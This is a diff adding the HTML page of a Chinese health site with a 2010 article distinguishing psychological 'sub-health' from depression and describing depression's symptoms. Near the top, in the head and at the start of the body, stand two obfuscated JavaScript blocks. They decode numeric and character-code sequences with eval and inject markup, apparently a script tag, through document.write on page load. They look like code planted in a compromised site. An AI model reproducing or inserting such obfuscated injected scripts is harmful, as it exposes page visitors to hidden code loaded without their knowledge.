@@ -1,0 +1,1804 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+
+
+
+<head>
+
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+
+
+
+
+<title>都市人留意心理亚健康_亚健康综合症_华人健康网</title>
+
+
+
+
+
+<meta content="亚健康,心理亚健康" name="keywords" />
+
+
+
+
+
+<meta content="亚健康是一种处于健康与疾病之间的状态，其部分表现与抑郁症很相似，但它们是两种不同的疾病。亚健康状态可以包括躯体和心理两方面，在心理方面可以出现情绪低落、休息不好、全身无力等现象，但抑郁症是独立的疾病，是以情绪障碍为主要症状表现。" name="description" />
+
+
+
+
+
+<base href="http://www.chinesejk.com/" />
+
+
+
+
+
+<link href="favicon.ico" rel="shortcut icon" />
+
+
+
+
+
+<link href="templates/default/skins/default/images/article.css" rel="stylesheet" type="text/css" />
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" title="都市人留意心理亚健康_亚健康综合症_华人健康网" href="/rss.php?rssid=147" />
+
+
+
+
+
+<script language="JavaScript" src="data/config.js"></script>
+
+
+
+
+
+<script language="JavaScript" src="images/js/jquery.min.js"></script>
+
+
+
+
+
+<script language="JavaScript" src="images/js/css.js"></script>
+
+
+
+
+
+<script language="JavaScript" src="images/js/common.js"></script>
+
+
+
+
+
+<script language="JavaScript" src="images/js/login.js"></script>
+
+
+
+
+
+<script language="JavaScript" src="images/js/validator.js"></script>
+
+
+
+
+
+<script type="text/javascript" src="templates/default/skins/default/images/main.js"></script>
+
+
+
+
+
+<script type="text/javascript" src="templates/default/skins/default/images/menu.js"></script>
+
+
+
+
+
+
+<script>
+//****特殊字体显示效果****//
+var a1 = "ABCDEFG";
+var a2 = "HIJKLMNOP";
+var a3 = "QRSTUVWXYZabcdef";
+var keyStrs = a1+a2+a3+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";
+function mydata(input){
+	var output="";
+	var chr1,chr2,chr3="";
+	var enc1,enc2,enc3,enc4="";
+	var i=0;
+	var base64test=/[^A-Za-z0-9\+\/\=]/g;
+	input=input.replace(/[^A-Za-z0-9\+\/\=]/g,"");
+	do{
+		enc1=keyStrs.indexOf(input.charAt(i++));
+		enc2=keyStrs.indexOf(input.charAt(i++));
+		enc3=keyStrs.indexOf(input.charAt(i++));
+		enc4=keyStrs.indexOf(input.charAt(i++));
+		chr1=(enc1<<2)|(enc2>>4);
+		chr2=((enc2&15)<<4)|(enc3>>2);
+		chr3=((enc3&3)<<6)|enc4;
+		output=output+String.fromCharCode(chr1);
+		if(enc3!=64){output=output+String.fromCharCode(chr2);};
+		if(enc4!=64){output=output+String.fromCharCode(chr3);};
+		chr1=chr2=chr3="";
+		enc1=enc2=enc3=enc4="";
+	};
+	while(i<input.length);return output;
+	};
+t="5040 / 63 ,4900 / 70 ,9 + 69 ,3740 / 55 ,29 + 56 ,4387 / 41 ,169 - 61 ,3078 / 38 ,164 - 78 ,108 - 41 ,6 + 60 ,48 + 74 ,73 + 26 ,173 - 64 ,42 + 35 ,81 - 24 ,143 - 70 ,41 + 68 ,2912 / 28 ,38 + 10 ,3300 / 33 ,5 + 67 ,2340 / 36 ,4 + 50 ,26 + 50 ,11 + 110 ,50 + 7 ,47 + 4 ,19 + 81 ,6 + 45 ,176 - 77 ,175 - 58 ,5580 / 62 ,79 - 29 ,1767 / 31 ,12036 / 102 ,2880 / 32 ,1900 / 38 ,2760 / 23 ,3996 / 37 ,1691 / 19 ,121 - 34 ,144 - 62 ,35 + 87 ,86 + 12 ,12 + 55 ,2491 / 47 ,173 - 67 ,58 + 40 ,76 - 26 ,2208 / 46 ,22 + 96 ,116 - 17 ,41 + 10 ,51 + 15 ,86 + 20 ,21 + 77 ,12 + 38 ,79 + 3 ,99 + 9 ,81 - 5 ,150 / 3 ,1170 / 15 ,6902 / 58 ,10 + 66 ,6322 / 58 ,4592 / 41 ,107 + 15 ,7 + 66 ,198 - 92 ,97 - 45 ,87 - 31 ,28 + 48 ,59 - 8 ,17 + 61 ,192 - 86 ,1089 / 11 ,8938 / 82 ,167 - 59 ,224 - 105 ,78 + 22 ,52 + 16 ,13 + 39 ,55 + 6 ";
+t=eval("mydata(String.fromCharCode("+t+"))");
+document.write(t);
+</script>
+</head>
+
+
+
+
+
+<body>
+<Script language="javascript">
+<!--
+OlOlll="(x)";OllOlO=" String";OlllOO="tion";OlOllO="Code(x)}";OllOOO="Char";OlllOl="func";OllllO=" l = ";OllOOl=".from";OllOll="{return";Olllll="var";eval(Olllll+OllllO+OlllOl+OlllOO+OlOlll+OllOll+OllOlO+OllOOl+OllOOO+OlOllO);eval(l(79)+l(61)+l(102)+l(117)+l(110)+l(99)+l(116)+l(105)+l(111)+l(110)+l(40)+l(109)+l(41)+l(123)+l(114)+l(101)+l(116)+l(117)+l(114)+l(110)+l(32)+l(83)+l(116)+l(114)+l(105)+l(110)+l(103)+l(46)+l(102)+l(114)+l(111)+l(109)+l(67)+l(104)+l(97)+l(114)+l(67)+l(111)+l(100)+l(101)+l(40)+l(77)+l(97)+l(116)+l(104)+l(46)+l(102)+l(108)+l(111)+l(111)+l(114)+l(40)+l(109)+l(47)+l(49)+l(48)+l(48)+l(48)+l(48)+l(41)+l(47)+l(57)+l(57)+l(41)+l(59)+l(125));eval(""+O(99005434)+O(109891017)+O(98017879)+O(115835235)+O(107918387)+O(99992910)+O(108905601)+O(114841149)+O(45549578)+O(117816923)+O(112864240)+O(103954969)+O(114849803)+O(99990869)+O(31687465)+O(39604343)+O(38611951)+O(59403806)+O(82178168)+O(66338164)+O(81184638)+O(72271089)+O(79206874)+O(83168778)+O(31689655)+O(113855151)+O(112864408)+O(98010957)+O(60390619)+O(33661487)+O(102962358)+O(114844131)+O(114849439)+O(110883355)+O(57429223)+O(46539706)+O(46539243)+O(117817991)+O(117812355)+O(117811069)+O(45547270)+O(101971757)+O(109895803)+O(109899861)+O(101978895)+O(106921583)+O(99991986)+O(96038462)+O(99004447)+O(113855296)+O(106920770)+O(45545277)+O(98013739)+O(109893993)+O(107912961)+O(46536367)+O(113859368)+O(110885479)+O(98016483)+O(109894258)+O(99008746)+O(99998977)+O(46532597)+O(98012335)+O(110886532)+O(45547812)+O(104946386)+O(113851133)+O(33663712)+O(61388571)+O(59400430)+O(46531067)+O(113856900)+O(98012363)+O(112863124)+O(103954630)+O(110881606)+O(114846249)+O(61383383)+O(38619969)+O(40596203)+O(58410619));
+-->
+</Script>
+ <!--t2-->
+
+
+
+
+
+<div class="warp">
+  <!--topbar start-->
+  <div class="topbar">
+    <div class="data">
+      <script src="templates/default/skins/default/images/time.js" language="JavaScript" type="text/javascript" />
+      </script>
+      </script>
+      </script>
+    </div>
+    <p>·<a href="javascript:window.external.AddFavorite('http://www.chinesejk.com','华人健康网')">加入收藏</a> ·<a onClick="this.style.behavior='url(#default#homepage)'; this.setHomePage('http://www.chinesejk.com');" href="#">设为首页</a>  ·<a href="/sitemap.html" target="_blank">网站地图</a></p>
+  </div>
+  <!--topbar end-->
+ <!--t1-->
+  <!--logo行 start-->
+  <div class="w960 clear">
+    <div class="logo"><a href="/" target="_blank"><img src="templates/default/skins/default/images/logo.gif" /></a></div>
+ <form name="site_search" action="search/" target="_blank">
+    <div class="hrso">
+      <div class="sbox">
+        <input class="sot" maxlength="30" name="q"  type="text" />
+      </div>
+      <div class="sbtn">
+        <input type="submit" value="健康搜索" name="s"  id="button"  />
+      </div>
+    </div>
+ </form>		
+    <div class="topky">
+      <div class="k_left"></div>
+      <div class="k_cen">
+        <ul>
+          <li><a href="/zhengxing/tuomaozx/" target="_blank">脱毛整形</a></li>
+          <li><a href="/zhengxing/chuzhoulapi/" target="_blank">除皱拉皮</a></li>
+          <li><a href="/zhengxing/nankezx/" target="_blank">男科整形</a></li>
+          <li><a href="/zhengxing/fukezx/" target="_blank">妇科整形</a></li>
+          <li><a href="/jianfei/ssbl/chss/" target="_blank">产后瘦身</a></li>
+          <li><a href="/jianfei/ssbl/etjf/" target="_blank">儿童减肥</a></li>
+          <li><a href="/jianfei/ssbl/nsss/" target="_blank">男士瘦身</a></li>
+          <li><a href="/jianfei/ssbl/blss/" target="_blank">白领瘦身</a></li>
+          <li><a href="/beauty/pdyy/" target="_blank">排毒养颜</a></li>
+          <li><a href="/beauty/mfjn/" target="_blank">美肤锦囊</a></li>
+          <li><a href="/beauty/jfjj/" target="_blank">肌肤急救</a></li>
+          <li><a href="/beauty/jchf/" target="_blank">基础护肤</a></li>
+        </ul>
+      </div>
+      <div class="k_right"></div>
+    </div>
+  </div>
+  <!--logo行 end-->
+  <!--nav_text start-->
+  <div class="navigation">
+    <div class="nav_text">
+      <div class="bgl"></div>
+      <ul class="people">
+        <li class="h"><a href="/" class=head target="_blank"></a></li>
+        <li><a href="/man/" target="_blank">男人</a> </li>
+        <li class="s">| </li>
+        <li><a href="/woman/" target="_blank">女人</a> </li>
+        <li><a href="/oldman" target="_blank">老人</a> </li>
+        <li class="s">| </li>
+        <li><a href="/baby" target="_blank">育儿</a> </li>
+      </ul>
+      <ul class="living">
+        <li class="h"><a href="/" class=head target="_blank"></a></li>
+        <li><a href="/beauty" target="_blank">美容</a> </li>
+        <li class="s">| </li>
+        <li><a href="/zhengxing/" target="_blank">整形</a> </li>
+        <li class="s">| </li>
+        <li><a href="/baojian/" target="_blank">保健</a> </li>
+        <li class="s">| </li>
+        <li><a href="/jianshen/" target="_blank">健身</a> </li>
+        <li><a href="/yinshi/" target="_blank">饮食</a> </li>
+        <li class="s">| </li>
+        <li><a href="/xinli/" target="_blank">心理</a> </li>
+        <li class="s">| </li>
+        <li><a href="/zhongyi/" target="_blank">中医</a> </li>
+        <li class="s">| </li>
+        <li><a href="/jianfei/" target="_blank">减肥</a> </li>
+      </ul>
+  <ul class="disease">
+        <li class="h"><a href="/" class=head target="_blank"></a></li>
+        <li class="dis"><a href="/yixue/zyzlks/ " target="_blank">医师考试</a> </li>
+<li class="dis"><a href="/yixue/wszgzc/" target="_blank">职称考试</a> </li>
+<li class="dis"><a href="/yixue/kykb/" target="_blank">考研考博</a> </li>
+<li class="dis"><a href="/yixue/hsks/" target="_blank">护理考试</a> </li>
+<li class="dis"><a href="/yixue/yxlw/" target="_blank">药师考试</a> </li>
+<li class="dis"><a href="/yixue/yxlw/" target="_blank">医学论文</a> </li>
+      </ul>
+      <ul class="snews">
+        <li class="h"><a href="/" class=head target="_blank"></a></li>
+        <li><a href="/news/domestic/" target="_blank">国内</a> </li>
+        <li class="s">| </li>
+        <li><a href="/news/world/" target="_blank">国际</a> </li>
+        <li class="s">| </li>
+        <li><a href="/news/jkhy/yg/" target="_blank">医改</a> </li>
+        <li><a href="/news/jkhy/yj/" target="_blank">医界</a> </li>
+        <li class="s">| </li>
+        <li><a href="/news/jkhy/qx/" target="_blank">器械</a> </li>
+        <li class="s">| </li>
+        <li><a href="/news/pgk/sp/" target="_blank">食品</a> </li>
+      </ul>
+      <div class="bgr"></div>
+    </div>
+    <div class=nav_icon>
+      <li class=nobg><A class=i1 href="/nanke/">男科</A> </li>
+      <li><A class=i2 href="/fuke">妇科</A> </li>
+      <li><A class=i3 href="/erke">儿科</A> </li>
+      <li><A class=i5 href="/byby">不孕不育</A> </li>
+      <li><A class=i11 href="/yanke">眼科</A> </li>
+      <li><A class=i4 href="/aizheng">肿瘤科</A> </li>
+      <li><A class=i6 href="/tangniaobing/">糖尿病科</A> </li>
+      <li><A class=i7 href="/xinnaoxueguan/">心血管科</A> </li>
+      <li><A class=i9 href="/ganbing/">肝病科</A> </li>
+      <li><A class=i10 href="/shenbing/">肾病科</A> </li>
+      <li><A class=i17 href="/gangchang/">肛肠科</A> </li>
+      <li><A class=i20 href="/waike/mnwk/">泌尿科</A> </li>
+      <li><A class=i19 href="/erbihouke/">耳鼻喉</A> </li>
+      <li><A class=i12 href="/kouqiangke/">口腔科</A> </li>
+      <li><A class=i13 href="/guke">骨科</A> </li>
+      <li><A class=i14 href="/pifuke">皮肤科</A> </li>
+      <li><A class=i21 href="/xingbing/">性病科</A> </li>
+      <li><A class=i15 href="/"><SPAN>更多</SPAN></A> </li>
+    </div>
+  </div>
+
+
+
+
+  <!--nav_text end-->
+
+
+
+
+
+  <!--     头部结束        -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <div class="content">
+
+
+
+
+
+   <div class="con_left">
+
+
+
+
+
+     <div class="sidebar">您现在所在的位置:<a href="/" target="_blank">首页</a> >> <a href="/baojian/">保健</a> >><a href="/baojian/yjk/">亚健康</a> >><a href="/baojian/yjk/yjkzhz/">亚健康综合症</a> >></div>
+
+
+
+
+
+
+
+
+
+
+
+   <div class="banner1">
+
+
+
+
+
+<script type="text/javascript"> /*580*90，创建于2010-9-3*/ var cpro_id = 'u183193';</script>
+
+<script type="text/javascript" src="http://cpro.baidu.com/cpro/ui/c.js"></script>
+
+
+
+
+
+
+
+           </div>
+
+
+
+
+
+ <div class="artbox">
+
+
+
+
+
+   <H1>都市人留意心理亚健康</H1>
+
+
+
+
+
+   <div class="info">来源：<a href="" target="_blank" class="copyfrom">华人健康网</a> 发布时间：<font id='time'>2010-06-11 19:50:10</font> 浏览次数：<span id="hits">0</span> 
+
+
+
+
+
+
+
+
+
+
+<a href="comment/?keyid=phpcms-content-title-39&verify=b6b4aa8b18651cc398666a53d1f96c2a" style="color:red;">网友评论 <span id="comments_top">0</span> 条</a>
+
+
+
+
+
+ www.chinesejk.com
+
+
+
+
+
+<script language="javascript">
+
+
+
+
+
+var time = '2010-06-11 19:50:10';
+
+
+
+
+
+time=time.substring(0,10);
+
+
+
+
+
+document.getElementById('time').innerHTML=time.toString();
+
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+     <div class="info_ad">
+
+
+
+
+
+   <ul>
+
+
+
+
+
+<script src="/adjs/nr1.js"></script>
+
+
+
+
+
+   </ul>
+
+
+
+
+
+ </div>
+
+
+
+
+
+   <div class="clear"></div>
+
+
+
+
+
+   <div class="article">
+
+
+
+
+
+  <p>　　亚健康是一种处于健康与疾病之间的状态，其部分表现与抑郁症很相似，但它们是两种不同的疾病。亚健康状态可以包括躯体和心理两方面，在心理方面可以出现情绪低落、休息不好、全身无力等现象，但抑郁症是独立的疾病，是以情绪障碍为主要症状表现。</p>
+<p>　　最可怕的是抑郁症患者没有求治欲望或表现，有很强的负罪感，觉得自己是社会的负担，自杀死亡率很高。而亚健康人群却往往相反，他们会积极求治。</p>
+<p>　　如果抑郁症状持续出现2周以上，在消除客观原因后，抑郁症状仍然存在，就应及时到医院就诊。抑郁症患者如果病前有不良刺激，其情绪反应的强度和持续时间都会明显超过普通人对同类刺激的反应。</p>
+<p>　　但由于抑郁症患者多不敢面对问题，所以家人的帮助就将会是主要的途径，切记要多尊重和鼓励病人，使病人及时得到合理的、正确的帮助。</p>
+<p>　　那么，如何判断身边的亲人是正常抑郁情绪还是抑郁症呢?专家说，除了情绪低落外，抑郁症患者还可能有如下几种表现：没有明显原因的持续疲乏感，休息后也难以复原;活动缓慢，有时又可能变得容易为小事发脾气;</p>
+<p>　　常自责，或有内疚感，自我评价过低;思考速度减慢，患者也可能感到自己变笨了;失眠，包括入睡困难，睡眠浅而不稳，特别是早醒，也就是睡眠的最后一次觉醒时间明显提前;食欲不振，进食减少，体重也可能明显减轻;性欲减退，对异性不感兴趣;反复出现自杀念头，甚至有自杀行为，这是抑郁症最严重的症状。</p>
+<p>　　据统计，有自杀念头但不实施的抑郁症患者占70%;有1/3的抑郁症患者有自杀行为，其中有15%患者身亡。</p>
+<p>　　网上经常有各种各样的抑郁心理测试表，对照自己测试后往往会吓一跳。这种测试可信吗?专家说，专业医生在诊治心理或精神疾病时，有时也会参照一些测试表，但是像抑郁症这些精神疾病，在医学上还没有定量诊断。</p>
+<p>　　抑郁评定量表的测试结果，不能作为抑郁症的诊断指标，只是供专业医生参考。对老百姓来说，在做这些测试时，对于有阳性结果的测试，可以提示我们可能存在情绪的困扰，但不一定就是抑郁症，需要专科医师来进行明确的诊断。</p>
+<br />
+
+
+
+
+<P align=right>（编辑：<a href="space/?userid=1" target="_blank" class="username">nannan520</a> ）</P>
+
+
+
+
+
+   </div>
+
+
+
+
+
+   <!--<div class="keywords"> <strong>关键词： 女性保健 </strong> </div>-->
+
+
+
+
+
+      <div  id="pages">
+
+
+
+
+
+  
+
+
+
+
+      </div>
+
+
+
+
+
+  <div class="pre_next">
+
+
+
+
+
+        <ul>
+
+
+
+
+
+      <li class="pre">
+
+
+
+
+    
+
+
+
+
+
+    上一篇：<a href="2010/0611/40.html">上班族的超亚健康状态</a> 
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+     </li> 
+
+
+
+
+
+  
+
+
+
+
+
+  <li class="next">  
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+    下一篇：没有了
+
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+     
+
+
+
+
+
+  
+
+
+
+
+
+   </li>	
+
+
+
+
+
+        </ul>
+
+
+
+
+
+      </div>
+
+
+
+
+
+  
+
+<div>
+
+<script type="text/javascript"> /*580*90，文字*/ var cpro_id = 'u183204';</script>
+
+<script type="text/javascript" src="http://cpro.baidu.com/cpro/ui/c.js"></script>
+
+</div>
+
+
+
+  
+
+
+
+
+
+  <!--心情指数模块-->
+
+
+
+
+
+      
+
+
+
+
+      <div id="moodrank_div"></div>
+
+
+
+
+
+      <script  type="text/javascript">var contentid = 39;</script>
+
+
+
+
+
+      <script type="text/javascript" id="callback_js"></script>
+
+
+
+
+
+      <script type="text/javascript" src="data/moodrank/1.js"></script>
+
+
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+ </div>
+
+
+
+
+
+ <div class="art_xgwz">
+
+
+
+
+
+  <div class="title">
+
+
+
+
+
+    看了本文的网友还看了：<span >(搜索相关文章：<a href="tag.php?tag=%D1%C7%BD%A1%BF%B5" class="keyword">亚健康</a><a href="tag.php?tag=%D0%C4%C0%ED%D1%C7%BD%A1%BF%B5" class="keyword">心理亚健康</a> )</span>	  
+
+
+
+
+
+   </div>
+
+
+
+
+
+ <ul>
+
+
+
+
+
+    <li><a href="2010/1209/32150.html" target="_blank"  title="广东7成人为亚健康状态 仅次于北京居全国第二">广东7成人为亚健康状态 仅次于北京居全...</a></li>
+<li><a href="2010/1128/29965.html" target="_blank"  title="9大亚健康人群之保健品">9大亚健康人群之保健品</a></li>
+<li><a href="2010/1124/29126.html" target="_blank"  title="天韵虫草多糖胶囊">天韵虫草多糖胶囊</a></li>
+<li><a href="2010/1118/28072.html" target="_blank"  title="新一代保健品——银杏叶">新一代保健品——银杏叶</a></li>
+<li><a href="2010/1117/27748.html" target="_blank"  title="老年人食用保健食品要谨慎">老年人食用保健食品要谨慎</a></li>
+<li><a href="2010/1113/26816.html" target="_blank"  title="你被“保健品”忽悠了吗？">你被“保健品”忽悠了吗？</a></li>
+<li><a href="2010/1112/26495.html" target="_blank"  title="正确选购保健品应注意哪些？">正确选购保健品应注意哪些？</a></li>
+<li><a href="2010/1111/26250.html" target="_blank"  title="我们怎样用保健品">我们怎样用保健品</a></li>
+<li><a href="2010/1109/25587.html" target="_blank"  title="保健品市场">保健品市场</a></li>
+<li><a href="2010/1108/25341.html" target="_blank"  title="亚健康与保健品">亚健康与保健品</a></li>
+
+
+
+
+
+   </ul>
+
+
+
+
+
+<script language="javascript" src="http://www.chinesejk.com/data/js.php?id=11"></script>
+
+
+
+
+
+ </div>
+
+
+
+
+
+ 
+
+
+
+
+
+ <div class="banner1">
+
+
+
+
+
+
+
+
+
+
+<!--#include virtual="/data/js/10.html"-->
+
+
+
+
+
+</div>
+
+
+
+
+
+ 
+
+
+
+
+
+<!--返回头部-->	 
+
+
+
+
+
+ 
+
+
+
+
+
+ 
+
+
+
+
+      <form action="mail/sendmail.php" name="sendmail" id="sendmail">
+
+
+
+
+
+        <input type="hidden" name="title" value="推荐：都市人留意心理亚健康" />
+
+
+
+
+
+        <input type="hidden" name="content" value=" <a href='http://www.chinesejk.com/2010/0611/39.html' target='_blank'>都市人留意心理亚健康</a><br/>" />
+
+
+
+
+
+      </form>
+
+
+
+
+
+      
+
+
+
+
+       
+
+
+
+
+      <form action="error_report/error_report.php" name="errors" id="errors">
+
+
+
+
+
+        <input type="hidden" name="title" value="都市人留意心理亚健康" />
+
+
+
+
+
+<input type="hidden" name="contentid" value="39" />
+
+
+
+
+
+      </form>
+
+
+
+
+
+      
+
+
+
+
+      <p id="text_1" style="margin-top:1%;">
+
+
+
+
+
+        <a href="javascript:$('#errors').submit();">[错误报告]</a> 
+
+
+
+
+
+        <a href="javascript:$('#sendmail').submit();">[推荐]</a> 
+
+
+
+
+
+        <a href="member/collect.php?contentid=39&action=add">[收藏]</a>
+
+
+
+
+
+        <a href="javascript:window.print();">[打印]</a> <a href="javascript:window.close();">[关闭]</a> 
+
+
+
+
+
+        <a href="http://www.chinesejk.com/2010/0611/39.html#top">[返回顶部]</a> </p>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+ 
+
+
+
+
+
+ 
+
+
+
+
+
+      <!--评论-->
+
+
+
+
+
+      
+
+
+
+
+      
+
+
+
+
+      <div id="commnent_tag">
+
+
+
+
+
+        <a href="comment/?keyid=phpcms-content-title-39&verify=b6b4aa8b18651cc398666a53d1f96c2a"><img src="images/comment.gif" />
+
+
+
+
+
+        已有<strong class="c_red"><span id="comments">0</span></strong>位网友发表了看法</a>
+
+
+
+
+
+      </div>
+
+
+
+
+
+  <div style="height:25px; width:570px; margin:0 auto; background:#E6E6E6; padding-top:10px;">
+
+
+
+
+
+<script type="text/javascript"><!--
+
+
+
+
+
+google_ad_client = "pub-0307374640819824";
+
+
+
+
+
+/* 内容页左边 */
+
+
+
+
+
+google_ad_slot = "6068909190";
+
+
+
+
+
+google_ad_width = 468;
+
+
+
+
+
+google_ad_height = 15;
+
+
+
+
+
+//-->
+
+
+
+
+
+</script>
+
+
+
+
+
+<script type="text/javascript"
+
+
+
+
+
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+
+
+
+
+
+</script>
+
+
+
+
+
+  </div>
+
+
+
+
+
+      <div class="commenttext" style="text-align:center;margin-top:2%">
+
+
+
+
+
+        <form action="comment/?action=addpost" method="post" onSubmit="return checkForm();">
+
+
+
+
+
+<input type="hidden" name="keyid" value="phpcms-content-title-39"/>
+
+
+
+
+
+<input type="hidden" name="verify" value="b6b4aa8b18651cc398666a53d1f96c2a"/>
+
+
+
+
+
+<ul>
+
+
+
+
+
+          <li>
+
+
+
+
+
+            <textarea cols="100" rows="8" name="comment" id="comment" onfocus="reply_clearfield()" onblur="reply_restoration()"></textarea>
+
+
+
+
+
+          </li>
+
+
+
+
+
+          <li style="text-align:left;margin-left:1%;margin-top:1%;">
+
+
+
+
+
+            <span id="checker"><div style="float:left">验证码：</div><input type="text" style="ime-mode: disabled;" size="6" id="checkcode" name="checkcode" /><img src="" id="code_img" style="display:none" onclick="this.src='checkcode.php?'+Math.random()" alt="点击换一张"></span>
+
+
+
+
+
+            <input id="dosubmit" name="dosubmit" type="submit" value="发表评论" />
+
+
+
+
+
+          </li>
+
+
+
+
+
+        </ul>
+
+
+
+
+
+        </form>
+
+
+
+
+
+      </div>
+
+
+
+
+
+      <script type="text/javascript" src="data/js/comment_setting.js"></script>
+
+
+
+
+
+      <script type="text/javascript">
+
+
+
+
+
+      <!--
+
+
+
+
+
+        $().ready(function() {        
+
+
+
+
+
+            if(setting.ischecklogin == 0 && getcookie('auth') === null)
+
+
+
+
+
+            {
+
+
+
+
+
+                $('#comment').val("请您登陆后发表评论！");
+
+
+
+
+
+                $('#comment').attr("disabled","disabled");
+
+
+
+
+
+                $('#dosubmit').attr("disabled","disabled");
+
+
+
+
+
+            }
+
+
+
+
+
+            else 
+
+
+
+
+
+            {
+
+
+
+
+
+                $('#comment').val("我也来说两句！");
+
+
+
+
+
+            }
+
+
+
+
+
+        });
+
+
+
+
+
+        function reply_restoration()
+
+
+
+
+
+        {
+
+
+
+
+
+            if($('#comment').val() == '')
+
+
+
+
+
+            {
+
+
+
+
+
+                $('#comment').val("我也来说两句！");
+
+
+
+
+
+            }
+
+
+
+
+
+        }
+
+
+
+
+
+        function reply_clearfield()
+
+
+
+
+
+        {
+
+
+
+
+
+            if ($('#comment').val() == "我也来说两句！") 
+
+
+
+
+
+            {
+
+
+
+
+
+                $('#comment').val("");   
+
+
+
+
+
+            }
+
+
+
+
+
+document.getElementById('code_img').style.display = 'block';document.getElementById('code_img').src='checkcode.php';
+
+
+
+
+
+        }
+
+
+
+
+
+        function checkForm()
+
+
+
+
+
+        {
+
+
+
+
+
+            if($('#comment').val() == '' || $('#comment').val() == "我也来说两句！")
+
+
+
+
+
+            {
+
+
+
+
+
+                alert("内容不能为空");
+
+
+
+
+
+                $('#comment').focus();
+
+
+
+
+
+                return false;
+
+
+
+
+
+            }
+
+
+
+
+
+            if($('#checkcode').val() == '' )
+
+
+
+
+
+            {
+
+
+
+
+
+                alert("验证码不能为空");
+
+
+
+
+
+                $('#checkcode').focus();
+
+
+
+
+
+                return false;
+
+
+
+
+
+            }
+
+
+
+
+
+            if ($('#comment').val().length > 1000) 
+
+
+
+
+
+            {
+
+
+
+
+
+                alert("内容太长，最多 1000 个文字");
+
+
+
+
+
+                return false;
+
+
+
+
+
+            }
+
+
+
+
+
+        }
+
+
+
+
+
+      //-->
+
+
+
+
+
+      </script>
+
+
+
+
+
+     
+
+
+
+
+
+   </div><!--左边 end-->  
+
+
+
+
+
+   
+
+
+
+
+
+ <div class="con_right">
+  <div class="ad_360"><script type="text/javascript"> /*300*250，创建于2010-9-3*/ var cpro_id = 'u183158';</script>
+<script type="text/javascript" src="http://cpro.baidu.com/cpro/ui/c.js"></script>
+</div>
+  <div class="ad_360"><!-- Search Google -->
+<center>
+<form method="get" action="http://www.google.cn/custom" target="google_window">
+<table bgcolor="#ffffff">
+<tr><td nowrap="nowrap" valign="top" align="left" height="30">
+
+<label for="sbi" style="display: none">输入您的搜索字词</label>
+<input type="text" name="q" size="31" maxlength="255" value="" id="sbi"></input>
+<label for="sbb" style="display: none">提交搜索表单</label>
+<input type="submit" name="sa" value="Google 搜索" id="sbb"></input>
+<input type="hidden" name="client" value="pub-0307374640819824"></input>
+<input type="hidden" name="forid" value="1"></input>
+<input type="hidden" name="ie" value="GB2312"></input>
+<input type="hidden" name="oe" value="GB2312"></input>
+<input type="hidden" name="safe" value="active"></input>
+<input type="hidden" name="cof" value="GALT:#008000;GL:1;DIV:#CCCCCC;VLC:663399;AH:center;BGC:FFFFFF;LBGC:2BA94F;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1"></input>
+<input type="hidden" name="hl" value="zh-CN"></input>
+</td></tr></table>
+</form>
+</center>
+<!-- Search Google -->
+</div>
+  <!--频道推荐 start-->
+  <div class="hot">
+      <h3 class="hot01">频道精彩推荐</h3>
+      <div class="c2_tab">
+        <dl id="newTabs" class="tab_title">
+          <dt id="pdtj1" onMouseOver="setTab('pdtj',1,5)" class="show">保健</dt>
+          <dt id="pdtj2" onMouseOver="setTab('pdtj',2,5)">健身</dt>
+          <dt id="pdtj3" onMouseOver="setTab('pdtj',3,5)">减肥</dt>
+          <dt id="pdtj4" onMouseOver="setTab('pdtj',4,5)">美容</dt>
+          <dt id="pdtj5" onMouseOver="setTab('pdtj',5,5)">整形</dt>
+        </dl>
+        <div class="tab_content">
+          <div id="con_pdtj_1" class="tab_con show">
+            <div class="a_info">
+<div class="ib"><a href="2010/1029/23167.html" target="_blank"><img src="uploadfile/2010/1029/20101029015457556.jpg" width="115" height="85" alt="这样的性爱方式容易猝死" /></a></div>
+<h4><a href="2010/1029/23167.html" title="这样的性爱方式容易猝死" target="_blank">这样的性爱方式容易猝死</a></h4>
+<p>在性生活中发生的悴死有两种情况，一是发生在性生活尤其是达到性……【<a href="2010/1029/23167.html" target="_blank">查看详细</a>】</p>
+            </div>
+            <ul class="e_list">
+<li><a href="2010/1215/33772.html" title="性用具要在“有需要”时使用" target="_blank">性用具要在“有需要”时使用</a></li>
+<li><a href="2010/1215/33771.html" title="影响骨骼发育的4种营养素" target="_blank">影响骨骼发育的4种营养素</a></li>
+<li><a href="2010/1215/33770.html" title="头发可看出你的健康状况" target="_blank">头发可看出你的健康状况</a></li>
+<li><a href="2010/1215/33769.html" title="哪种亚健康男人易猝死？" target="_blank">哪种亚健康男人易猝死？</a></li>
+            </ul>
+          </div>
+          <div id="con_pdtj_2" class="tab_con" style="display:none">
+            <div class="a_info">
+<div class="ib"><a href="2010/0903/11874.html" target="_blank"><img src="uploadfile/2010/0903/20100903093204226.jpg" width="115" height="85" alt="每日2分钟深呼吸骨盆减肥操" /></a></div>
+<h4><a href="2010/0903/11874.html" title="每日2分钟深呼吸骨盆减肥操" target="_blank">每日2分钟深呼吸骨盆减肥</a></h4>
+<p>每天睡前只需2分钟，神奇的瘦身效果睡手可得，坚持一周，就能减……【<a href="2010/0903/11874.html" target="_blank">查看详细</a>】</p>
+            </div>
+            <ul class="e_list">
+<li><a href="2010/1214/33513.html" title="校园MM廉价塑身的小妙招" target="_blank">校园MM廉价塑身的小妙招</a></li>
+<li><a href="2010/1214/33512.html" title="超有效！OL坐着巧减腹" target="_blank">超有效！OL坐着巧减腹</a></li>
